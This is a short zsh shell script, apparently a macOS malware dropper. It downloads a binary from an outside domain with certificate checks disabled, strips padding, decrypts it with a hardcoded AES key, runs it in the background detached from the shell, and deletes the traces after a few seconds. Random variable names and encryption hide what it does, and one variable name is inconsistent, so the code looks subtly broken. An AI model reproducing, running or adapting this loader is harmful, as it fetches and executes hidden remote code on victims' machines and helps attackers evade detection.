#!/bin/zsh
vc6ht=$(mktemp /tmp/bhyfv3.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m71b80880cb62f438.bin" -o "$vc6htz" || exit 1
uydd6c=$(stat -f %z "$vc6htz"); wpzn942=$(( uydd6c - 567 - 3084 ))
tail -c +$(( 567 + 1 )) "$vc6htz" | head -c $wpzn942 | openssl enc -d -aes-256-cbc -k 7fe40c4882b467e25e2ae4b1 -out "$vc6ht" 2>/dev/null
[ -s "$vc6ht" ] && chmod 700 "$vc6ht" && ( "$vc6ht" & ) && disown
( sleep 3; rm -f "$vc6ht" "$vc6htz" ) &>/dev/null &
